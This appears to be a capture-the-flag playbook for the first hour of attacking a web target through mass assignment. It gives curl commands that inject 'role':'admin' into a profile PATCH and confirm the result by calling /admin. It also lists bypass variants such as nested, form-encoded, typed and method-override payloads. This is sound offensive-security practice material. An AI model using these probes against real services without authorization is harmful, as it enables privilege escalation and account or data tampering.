# First hour — what to do in the first sixty minutes

## Minutes 0–10: the recon

```bash
python3 tools/state.py <name> --category web --target <url>
curl -i "$BASE" && curl -s -b "$JAR" "$BASE/api/me" | jq 'keys'
python3 tools/web/bundle_miner.py --url <bundle> --out /tmp/bundle
```

The field inventory: every key the `GET` returns is a candidate. The
endpoint inventory: every body-accepting route is a binder.

## Minutes 10–20: the binder fingerprint

Response headers (`X-Powered-By`, cookies, error pages) → the stack;
the stack → the binder family. Send one wrong-typed probe — the
validation error often lists the schema's field names.

## Minutes 20–30: the first probe

```bash
# control
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"display_name":"x"}'

# canary — ONE extra field
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"display_name":"x","role":"admin"}'

# read-back — DIFFERENT endpoint
curl -b "$JAR" "$BASE/api/me"
```

Or `binding_probe.py` for the automated matrix.

## Minutes 30–40: read the result

- `role:"admin"` → exercise: `GET /admin` → `200` = confirmed;
- `role:"user"` → endpoint falsifier; queue nested + form + `PUT`;
- `400` → schema falsifier; queue form + multipart;
- `role` absent → serializer-hidden; exercise the decision directly.

## Minutes 40–55: the tunnels

- `{"profile":{"role":..}}` nested;
- `role=admin` form-encoded;
- `role:true`/`role:1`/`roles:[..]` typed variants;
- `PUT` + full body; `?_method=PATCH` override;
- second semantics: `verified`, `balance`, `permissions`.

## Minutes 55–60: record + decide

- stored + decision → `post-probe confirms` → the flag path;
- falsifiers → `post-probe falsified` per cell → `decide.py` names the
  next live cell or the next class;
- inert fields → record; try the gate's real field.
